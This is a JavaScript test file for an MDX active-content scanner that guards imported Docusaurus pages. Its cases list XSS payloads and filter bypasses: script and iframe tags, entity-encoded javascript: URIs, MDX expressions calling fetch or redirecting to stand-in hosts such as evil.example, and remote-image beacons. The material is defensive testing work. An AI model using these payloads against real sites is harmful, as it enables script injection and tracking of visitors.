import assert from 'node:assert/strict';
import test from 'node:test';
import { findActiveContent } from '../scripts/lib/mdx-active-content.mjs';

const reasons = (markdown) => findActiveContent(markdown).map((f) => f.reason);

test('accepts prose, inert inline tags and the importer-generated preamble', () => {
  const body = [
    "import CNCFProjectCard from '@site/src/components/CNCFProjectCard';",
    '',
    '# Platform',
    '',
    'Runs on Kubernetes<br />and uses <strong>etcd</strong>.',
    '',
    '<CNCFProjectCard name="Kubernetes" href="https://www.cncf.io/projects/kubernetes/" />',
    '',
    '![Diagram](/img/architectures/acme/diagram.svg)',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

// Each row is a body outside the allowlists and the findings it produces. The
// bypasses the denylist this gate replaced kept missing are rows here, so a
// regression in any of them fails by name.
const REJECTED = [
  [
    'script element',
    '<script>alert(1)</script>',
    ['disallowed element <script>'],
  ],
  [
    'unknown element',
    '<iframe src="https://evil.test"></iframe>',
    ['disallowed element <iframe>'],
  ],
  [
    'event handler on an allowed element',
    '<b onClick="x">x</b>',
    ['disallowed attribute onClick on <b>'],
  ],
  [
    'string style attribute, which React refuses to render',
    '<p style="color:red">x</p>',
    ['disallowed attribute style on <p>'],
  ],
  [
    'attribute the component does not take',
    '<CNCFProjectCard name="K" onLoad="x" />',
    ['disallowed attribute onLoad on <CNCFProjectCard>'],
  ],
  ['spread attribute', '<b {...props}>x</b>', ['MDX expression']],
  ['fragment', '<>x</>', ['disallowed element <>']],
  [
    'unclosed element MDX cannot compile',
    '<div>unclosed',
    [/^MDX parse error/],
  ],
  [
    'unquoted attribute MDX cannot compile',
    '<img src=x onerror=alert(1)>',
    [/^MDX parse error/],
  ],
  [
    'script URI in a link',
    '[click](javascript:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'unknown scheme in a link',
    '[x](ftp://example.com/)',
    ['disallowed URL scheme ftp:'],
  ],
  [
    'data: URI in a link',
    '[d](&#100;ata:text/html;base64,PHN2Zz4=)',
    ['disallowed URL scheme data:text/html'],
  ],
  [
    'data: URI in an image',
    '![p](data:image/png;base64,AAAA)',
    ['disallowed URL scheme data:image/png'],
  ],
  [
    'script URI in a definition',
    '[x]: javascript:alert(1)\n\n[x]',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'script URI in an image',
    '![x](javascript:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'script URI in a component literal expression',
    '<CNCFProjectCard href={"javascript:alert(1)"} />',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'decimal reference hiding a scheme',
    '[click](java&#115;cript:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'hex reference hiding a scheme',
    '[click](javascript&#x3a;alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'named reference hiding a colon',
    '[click](javascript&colon;alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'double-encoded reference',
    '[click](java&amp;#115;cript:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'referenced control character inside a scheme',
    '[click](java&#9;script:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
  [
    'raw and decoded forms on one line, reported once',
    '[a](javascript:alert(1)) [b](java&#115;cript:alert(1))',
    ['disallowed URL scheme javascript:'],
  ],
];

for (const [label, body, expected] of REJECTED) {
  test(`reports ${label}`, () => {
    const actual = reasons(body);
    assert.equal(actual.length, expected.length, JSON.stringify(actual));
    expected.forEach((reason, index) =>
      reason instanceof RegExp
        ? assert.match(actual[index], reason)
        : assert.equal(actual[index], reason),
    );
  });
}

// None of these forms a scheme a browser would run: a raw tab ends a link
// destination, an undecodable or unknown reference stays literal (or becomes
// U+FFFD), and a space-separated pair is two words.
test('does not manufacture a scheme out of text a browser reads as relative', () => {
  for (const body of [
    '[click](java\tscript:alert(1))',
    '[click](java&#x110000;cript:alert(1))',
    '[click](java&#1114112;cript:alert(1))',
    `[click](java&#x${'f'.repeat(400)};cript:alert(1))`,
    `[click](java&#${'9'.repeat(400)};cript:alert(1))`,
    '[click](&#x110000;javascript:alert(1))',
    '[click](java&nbsp;script:alert(1))',
    'Budget rose by &#x110000; percent.',
    'Costs rose 5&nbsp;percent this quarter.',
    'Java Script: a short history of the name.',
    'Deploys to production&#58; see the runbook.',
  ]) {
    assert.deepEqual(reasons(body), [], JSON.stringify(body));
  }
});

test('reports a node kind outside the allowlist, such as one a new extension adds', () => {
  const html = {
    transforms: [
      (tree) => {
        tree.children[0].type = 'html';
      },
    ],
  };
  assert.deepEqual(
    findActiveContent('x', { mdastExtensions: [html] }).map(
      ({ reason }) => reason,
    ),
    ['disallowed node type html'],
  );
});

test('flags ESM statements other than the generated CNCFProjectCard import', () => {
  assert.deepEqual(reasons("import evil from 'https://evil.test/x.js';"), [
    'unexpected ESM statement',
  ]);
  assert.deepEqual(reasons('export const x = 1;'), [
    'unexpected ESM statement',
  ]);
});

test('ignores fenced code blocks and inline code spans, which MDX does not evaluate', () => {
  const body = [
    '# T',
    '',
    '```html',
    '<script>alert(1)</script>',
    '```',
    '',
    'Use `<iframe>` sparingly.',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

test('ignores a fenced block spanning several content lines, not just one', () => {
  // Regression: a lazy regex ended the fence match at the
  // first content line instead of the closing fence, so a legitimate
  // multi-line block reported findings from its third line onward.
  const body = [
    '```js',
    'const a = 1;',
    'const b = 2;',
    '<script>alert(1)</script>',
    '```',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

test('reports a live element hidden by a mismatched backtick run, not a code span', () => {
  // Regression: CommonMark forms a code span only when the
  // closing backtick run has exactly the same length as the opening run, so
  // `` `` `` + payload + ` `` is live text, not a span -- but the old regex
  // (`` `+...`+ ``) blanked it as one anyway and hid the payload from every
  // downstream check.
  assert.deepEqual(reasons('``<script>alert(1)</script>`'), [
    'disallowed element <script>',
  ]);
  // The same trick also hides an event handler on an otherwise-allowlisted
  // element.
  assert.deepEqual(reasons('``<b onClick={alert}>hi</b>`'), [
    'disallowed attribute onClick on <b>',
  ]);
  // The equal-run control case must still be inert.
  assert.deepEqual(reasons('`<script>alert(1)</script>`'), []);
});

test('does not treat a backtick fence with a backtick in its info string as a fence', () => {
  // CommonMark: a backtick fence's info string may not itself contain a
  // backtick. A line like "```<script>x</script>`" therefore opens no fence
  // at all -- it is a live paragraph, not code. Reading it as a fence opener
  // would blank it (and everything after it, since no real closer follows),
  // hiding the payload the same way the mismatched-run bypass above did.
  assert.deepEqual(reasons('```<script>alert(1)</script>`'), [
    'disallowed element <script>',
  ]);
  // A genuine fenced block still blanks normally.
  assert.deepEqual(
    reasons(['```js', '<script>alert(1)</script>', '```'].join('\n')),
    [],
  );
  // A tilde fence has no such restriction, so a backtick in its info string
  // does not disqualify it.
  assert.deepEqual(
    reasons(['~~~js `x`', '<script>alert(1)</script>', '~~~'].join('\n')),
    [],
  );
});

test('follows the MDX parser on indented fences, which have no indented-code fallback', () => {
  // MDX turns indented code off, so the parser is the authority on whether an
  // indented fence opens a block. The scan reports whatever it leaves live and
  // ignores whatever it parses as code, with no fence rules of its own.
  const live = ['```js', '<script>alert(1)</script>', '    ```', '```'];
  assert.deepEqual(reasons(live.join('\n')), []);
  assert.deepEqual(
    reasons(['<script>alert(1)</script>', '    ```js'].join('\n')),
    ['disallowed element <script>'],
  );
  assert.deepEqual(
    reasons(['   ```js', '<script>alert(1)</script>', '```'].join('\n')),
    [],
  );
});

test('reports the line number of each finding and deduplicates per line and reason', () => {
  const body = ['# T', '', '<script>alert(1)</script>'].join('\n');
  assert.deepEqual(findActiveContent(body), [
    {
      line: 3,
      reason: 'disallowed element <script>',
      snippet: '<script>alert(1)</script>',
    },
  ]);
});

test('tolerates empty and nullish input', () => {
  assert.deepEqual(findActiveContent(''), []);
  assert.deepEqual(findActiveContent(undefined), []);
});

test('flags an MDX expression, which Docusaurus compiles to executable JavaScript', () => {
  assert.deepEqual(
    reasons('{(() => { document.location = "https://evil.example"; })()}'),
    ['MDX expression'],
  );
  assert.deepEqual(
    reasons('Body {globalThis.fetch("https://evil.example")}.'),
    ['MDX expression'],
  );
  assert.deepEqual(reasons('{[].constructor.constructor("return 1")()}'), [
    'MDX expression',
  ]);
});

test('flags the opening line of an expression that spans several lines', () => {
  const body = ['{(() => {', '  fetch("https://evil.example");', '})()}'].join(
    '\n',
  );
  assert.deepEqual(findActiveContent(body), [
    {
      line: 1,
      reason: 'MDX expression',
      snippet: '{(() => {',
    },
  ]);
});

test('accepts the string-literal attribute expressions the importer emits', () => {
  const card =
    '  <CNCFProjectCard name={"Kubernetes"} href={"https://www.cncf.io/projects/kubernetes/"} description={"Runs \\"most\\" of our workloads"} />';
  assert.deepEqual(findActiveContent(card), []);
});

test('flags an attribute expression that is more than a string literal', () => {
  assert.deepEqual(
    reasons('<CNCFProjectCard name={"a" + fetch("https://evil.example")} />'),
    ['MDX expression'],
  );
  assert.deepEqual(reasons('<CNCFProjectCard name={globalThis.evil} />'), [
    'MDX expression',
  ]);
});

test('does not flag braces inside code, which MDX does not evaluate', () => {
  assert.deepEqual(reasons('Run `kubectl get pods -o {.items}` to list.'), []);
  assert.deepEqual(
    reasons(['```json', '{ "replicas": 3 }', '```'].join('\n')),
    [],
  );
});

test('flags live content wedged between two multi-line code spans', () => {
  // A CommonMark inline code span pairs backticks across a single newline, so
  // `` `a\nb` `` and `` `c\nd` `` are two spans and the text between them is
  // live. A line-bounded scan instead paired `` b` `` with `` `c `` on the
  // middle line and blanked the payload with it. Each active form must be
  // reported, not hidden.
  assert.deepEqual(
    reasons('`a\nb` <iframe src="https://evil.test"></iframe> `c\nd`'),
    ['disallowed element <iframe>'],
  );
  assert.deepEqual(reasons('`a\nb` {fetch("https://evil.test")} `c\nd`'), [
    'MDX expression',
  ]);
  assert.deepEqual(reasons('`a\nb` [x](javascript:alert(1)) `c\nd`'), [
    'disallowed URL scheme javascript:',
  ]);
});

test('does not let a code span swallow a live paragraph across a blank line', () => {
  // Inline parsing stops at a paragraph boundary, so the opening backtick
  // before the blank line cannot close after it: the iframe is its own live
  // paragraph and must be reported rather than blanked as span content.
  assert.deepEqual(
    reasons('`a\n\n<iframe src="https://evil.test"></iframe>\n\nb`'),
    ['disallowed element <iframe>'],
  );
});

test('still treats a genuine multi-line code span as inert', () => {
  assert.deepEqual(reasons('`a\nb` and then `c\nd` as prose.'), []);
});

test('does not let a code span swallow live content across a block boundary', () => {
  // An unclosed backtick at the end of one block cannot pair with a backtick
  // in the next, so each payload below is live. MDX has no HTML blocks, so a
  // line starting with `<` does not end the paragraph and that one is a real
  // code span, which the parser (rather than a hand-written rule) decides.
  for (const interrupt of ['- ', '# ', '1. ', '> ']) {
    assert.deepEqual(
      reasons(
        `text \`\n${interrupt}<iframe src="https://evil.test"></iframe> \``,
      ),
      ['disallowed element <iframe>'],
      interrupt,
    );
  }
  assert.deepEqual(
    reasons('text `\n---\n<iframe src="https://evil.test"></iframe> `'),
    ['disallowed element <iframe>'],
  );
  assert.deepEqual(
    reasons('text `\n<iframe src="https://evil.test"></iframe> `'),
    [],
  );
});

test('still pairs a code span across a lazy paragraph continuation', () => {
  // A plain continuation line starts no block, so the span really does close
  // on it and its contents stay inert -- the stop must not fire here.
  // (micromark renders `a `x\n  plain y` b` as a single <code> span.)
  assert.deepEqual(reasons('a `x\n  plain y` b'), []);
  assert.deepEqual(reasons('- item `x\n  plain y` b'), []);
});

test('accepts a string-literal escape only when it parses as JSON', () => {
  assert.deepEqual(reasons('<CNCFProjectCard name={"a\\nb"} />'), []);
  assert.deepEqual(reasons('<CNCFProjectCard name={"\\q"} />'), [
    'MDX expression',
  ]);
});

test('reports a parse error on the line it occurs', () => {
  const [finding] = findActiveContent('fine\n\n<div>\n');
  assert.match(finding.reason, /^MDX parse error/);
  assert.equal(finding.line, 1);
  assert.equal(findActiveContent('<img src=x>')[0].line, 1);
});

// The second half of the invariant stated in scripts/lib/uri-safety.mjs: an
// imported page is third-party content, and every <img> in one is fetched by
// a visitor's browser with no user action, so a remote image destination is a
// beacon for their IP, User-Agent and Referer.
test('flags a remote image destination', () => {
  assert.deepEqual(reasons('![p](https://evil.example/p.png)'), [
    'remote image destination https://evil.example/p.png',
  ]);
  assert.deepEqual(reasons('![p](HTTP://Evil.Example/p.png)'), [
    'remote image destination http://evil.example/p.png',
  ]);
  assert.deepEqual(reasons('![p](//evil.example/p.png)'), [
    'remote image destination //evil.example/p.png',
  ]);
});

test('resolves an image reference through its definition', () => {
  assert.deepEqual(reasons('![p][x]\n\n[x]: https://evil.example/p.png'), [
    'remote image destination https://evil.example/p.png',
  ]);
  // The definition may be written before the reference that uses it.
  assert.deepEqual(reasons('[x]: https://evil.example/p.png\n\n![p][x]'), [
    'remote image destination https://evil.example/p.png',
  ]);
  // A collapsed reference carries the label as its identifier.
  assert.deepEqual(reasons('![evil][]\n\n[evil]: https://evil.example/p.png'), [
    'remote image destination https://evil.example/p.png',
  ]);
});

test('ignores a remote duplicate definition, which the renderer discards', () => {
  // A repeated label resolves to its first definition, so only the local
  // image below is ever loaded.
  assert.deepEqual(
    reasons(
      '![p][d]\n\n[d]: /img/architectures/acme/p.png\n[d]: https://evil.example/p.png',
    ),
    [],
  );
});

test('leaves an unresolved image reference alone', () => {
  // Nothing resolves it, so it renders as literal text and loads nothing.
  assert.deepEqual(reasons('![p][missing]'), []);
});

test('leaves links, link definitions and local images alone', () => {
  // rewriteImages() demotes a remote image *to* a remote link, and
  // docs/architectures/colopl.md carries remote link definitions, so a gate on
  // either would reject every imported page.
  assert.deepEqual(reasons('[x](https://good.example/)'), []);
  assert.deepEqual(reasons('[x][d]\n\n[d]: https://good.example/'), []);
  assert.deepEqual(reasons('![p](/img/architectures/acme/p.png)'), []);
  assert.deepEqual(reasons('![p](images/p.png)'), []);
  assert.deepEqual(reasons('[m](mailto:a@example.com) [f](#top)'), []);
});

test('flags a remote logo on the allowed component but not its remote href', () => {
  const card = (attributes) =>
    reasons(`<CNCFProjectCard name={"K"} ${attributes} />`);
  assert.deepEqual(card('logo={"https://evil.example/l.svg"}'), [
    'remote image destination https://evil.example/l.svg',
  ]);
  assert.deepEqual(card('logo="https://evil.example/l.svg"'), [
    'remote image destination https://evil.example/l.svg',
  ]);
  assert.deepEqual(card('logo={"/img/cncf-projects/k.svg"}'), []);
  assert.deepEqual(card('href={"https://www.cncf.io/projects/k/"}'), []);
});

test('truncates a long remote image destination in the reason', () => {
  const url = `https://evil.example/${'a'.repeat(200)}.png`;
  const [finding] = findActiveContent(`![p](${url})`);
  assert.equal(
    finding.reason,
    `remote image destination ${url.slice(0, 117)}...`,
  );
});

test('matches the element allowlist case-sensitively, as MDX reads tag names', () => {
  // MDX reads a lowercase tag name as an HTML element and any other casing as
  // a component reference, so `<B>` is not the inert `<b>` the allowlist
  // permits: it compiles to a lookup of a component named `B` that no
  // provider defines, and Docusaurus throws "Expected component `B` to be
  // defined" while prerendering. Lowercasing the name before the lookup
  // vouched for a body the renderer rejects.
  assert.deepEqual(reasons('<B>bold</B>'), ['disallowed element <B>']);
  assert.deepEqual(reasons('<Code>x</Code>'), ['disallowed element <Code>']);
  assert.deepEqual(reasons('<HR />'), ['disallowed element <HR>']);
  // The genuinely inert lowercase forms stay allowed.
  assert.deepEqual(reasons('<b>bold</b>'), []);
  assert.deepEqual(reasons('<code>x</code>'), []);
  assert.deepEqual(reasons('<hr />'), []);
});

// Docusaurus's mdx-loader runs unwrapMdxCodeBlocks() on every page before the
// MDX compiler sees it, deleting the fences of a ```mdx-code-block block and
// leaving its body behind as flow content, so the fence is reported in every
// form Docusaurus unwraps.
test('reports the four-backtick and indented forms Docusaurus also unwraps', () => {
  const fourBackticks = ['````mdx-code-block', '<b>x</b>', '````'].join('\n');
  assert.deepEqual(reasons(fourBackticks), [
    'mdx-code-block fence, whose body Docusaurus compiles as MDX rather than displaying as code',
  ]);

  const indented = [
    '- item',
    '',
    '  ```mdx-code-block',
    '  <b>x</b>',
    '  ```',
  ].join('\n');
  assert.deepEqual(reasons(indented), [
    'mdx-code-block fence, whose body Docusaurus compiles as MDX rather than displaying as code',
  ]);
});

test('reports active content exposed only when the whole document is unwrapped', () => {
  // The two fence grammars disagree about which closer pairs with the opener.
  // CommonMark ends the code node at the four-backtick line, so the node's own
  // slice is not something unwrapMdxCodeBlocks() rewrites and the per-node
  // check clears it. Docusaurus's pattern needs a closer of exactly three
  // backticks, skips the four-backtick line under `.*?`/`s`, and pairs the
  // opener with the bare fence at the end -- unwrapping the <img> into live
  // MDX. Before the whole-document pass this body scanned clean, validated,
  // and built to HTML carrying the remote <img> plus a preload link for it.
  const body = [
    '```mdx-code-block',
    '<img src="https://beacon.invalid/px.png" />',
    '````',
    '',
    '```',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), [
    {
      line: 2,
      reason: 'disallowed element <img>',
      snippet: '<img src="https://beacon.invalid/px.png" />',
    },
  ]);
});

test('maps an unwrapped-pass finding back to its true source line', () => {
  // Only the fence lines are deleted, so the unwrapped document's lines are a
  // subsequence of the source's and the reported line must be the one a reader
  // can open the file to, not the shifted line of the rewritten text.
  const body = [
    '## Overview',
    '',
    'Prose.',
    '',
    '```mdx-code-block',
    '<iframe src="https://evil.test"></iframe>',
    '````',
    '',
    '```',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), [
    {
      line: 6,
      reason: 'disallowed element <iframe>',
      snippet: '<iframe src="https://evil.test"></iframe>',
    },
  ]);
});

test('leaves ordinary fenced and inline code alone', () => {
  // The exemption is for the one info string Docusaurus rewrites, not for
  // code blocks in general: an architecture page showing a YAML snippet with
  // braces and angle brackets must still pass.
  const body = [
    '```yaml',
    'spec: { replicas: 3 }',
    '```',
    '',
    'Inline `<div onClick={x}>` stays code too.',
    '',
    '```mdx-code-block-ish',
    '<div onClick={x}>',
    '```',
  ].join('\n');
  assert.deepEqual(reasons(body), []);
});
